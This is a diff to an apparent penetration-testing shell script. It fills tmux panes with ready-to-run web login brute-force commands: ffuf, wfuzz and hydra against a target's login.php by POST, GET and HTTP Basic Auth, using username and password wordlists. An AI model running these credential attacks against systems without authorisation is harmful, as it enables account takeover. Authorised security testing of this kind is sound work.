@@ -3160,9 +3160,22 @@ tmux split-window -v -t PT:3.5
 tmux select-pane -t "3.5"
 tmux split-window -h -t "3.5"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:3.0 "# ù" Enter
-tmux send-keys -t PT:3.0 ""
+tmux send-keys -t PT:3.0 "# WEB Bruteforce AuthN - POST with ffuf" Enter
+tmux send-keys -t PT:3.0 "ffuf -request BurpSavedRequest.txt -request-proto http -w users.txt:FUZZUSR,passwords.txt:FUZZPW"
+tmux send-keys -t PT:3.1 "# WEB Bruteforce AuthN - POST with wfuzz" Enter
+tmux send-keys -t PT:3.1 "wfuzz -c -w names.txt -w passwords.txt -d \"username=FUZZ&password=FUZ2Z\" --hs \"No account found with that username\" http://$site/login.php"
+tmux send-keys -t PT:3.2 "# WEB Bruteforce AuthN - POST with hydra" Enter
+tmux send-keys -t PT:3.2 "hydra -L users.txt -P passwords.txt $site http-post-form \"/login.php:username=^USER^&password=^PASS^:F=No account found with that username\""
+tmux send-keys -t PT:3.3 "# WEB Bruteforce AuthN - GET with wfuzz" Enter
+tmux send-keys -t PT:3.3 "wfuzz -c -w users.txt -w passwords.txt -u \"http://$site/login.php?username=FUZZ&password=FUZ2Z\" --hc 403"
+tmux send-keys -t PT:3.4 "# WEB Bruteforce AuthN - GET with hydra" Enter
+tmux send-keys -t PT:3.4 "hydra -L users.txt -P passwords.txt $site http-get-form \"/login.php:username=^USER^&password=^PASS^:F=Invalid credentials\""
+tmux send-keys -t PT:3.5 "# WEB Bruteforce AuthN - Basic Auth with hydra" Enter
+tmux send-keys -t PT:3.5 "hydra -L users.txt -P passwords.txt $site http-get /"
+tmux send-keys -t PT:3.6 "# WEB Bruteforce AuthN - Basic Auth with ffuf" Enter
+tmux send-keys -t PT:3.6 "ffuf -w usernames.txt:W1 -w passwords.txt:W2 -u http://$site/protected/resource -H \"Authorization: Basic $(echo -n 'W1:W2' | base64)\" -fc 403"
 cd $folderProject
+
 
 
 # WEB Command Injection
